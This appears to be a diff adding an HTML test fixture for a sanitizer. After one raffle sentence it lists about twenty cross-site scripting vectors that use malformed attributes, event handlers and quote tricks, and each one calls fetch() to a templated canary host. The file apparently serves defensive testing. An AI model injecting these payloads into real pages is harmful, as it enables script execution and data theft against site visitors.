@@ -1,0 +1,22 @@
+<p>Raffle ticket numbers are drawn on Friday.</p>
+<img alt=`x` onerror=fetch('{{CANARY}}/{{ID}}/backtick-alt') src=x>
+<img alt="x`onerror=fetch('{{CANARY}}/{{ID}}/backtick-inside") src=x>
+<img/src/onerror=fetch('{{CANARY}}/{{ID}}/slash-separated')>
+<img src=x/onerror=fetch('{{CANARY}}/{{ID}}/slash-after-value')>
+<a href="x" title="&quot; onmouseover=&quot;fetch('{{CANARY}}/{{ID}}/title-quote-entity')">entity quote in title</a>
+<a title='"onmouseover="fetch(&#39;{{CANARY}}/{{ID}}/title-double-quote-in-single)'>raw quote in title</a>
+<img src="x" alt="a&#x22; onerror=&#x22;fetch('{{CANARY}}/{{ID}}/alt-hex-quote')">
+<img src=x:x onerror=fetch('{{CANARY}}/{{ID}}/weird-src')>
+<img src onerror=fetch('{{CANARY}}/{{ID}}/src-without-value')>
+<img src="1" onerror
+=fetch('{{CANARY}}/{{ID}}/equals-on-next-line')>
+<img src="1" "onerror=fetch('{{CANARY}}/{{ID}}/stray-quote') >
+<img src="1" =onerror=fetch('{{CANARY}}/{{ID}}/leading-equals')>
+<img src="1" onerror=fetch('{{CANARY}}/{{ID}}/unquoted-until-gt')/>
+<a href=x onclick=fetch('{{CANARY}}/{{ID}}/unquoted-click')>unquoted</a>
+<a href="x"onclick="fetch('{{CANARY}}/{{ID}}/no-space')">no space between attributes</a>
+<div title="</div><img src='{{CANARY}}/{{ID}}/tag-in-attr'>">tag inside attribute</div>
+<div data-x="<script>fetch('{{CANARY}}/{{ID}}/script-in-attr')</script>">script inside attribute</div>
+<div style="x:expression(fetch('{{CANARY}}/{{ID}}/style-attr-expression'))" title='"'>mixed quotes</div>
+<img src="x" ALT="a" alt="b" onerror="fetch('{{CANARY}}/{{ID}}/duplicate-alt')">
+<input value="x" onfocus="fetch('{{CANARY}}/{{ID}}/value-before-handler')" autofocus>
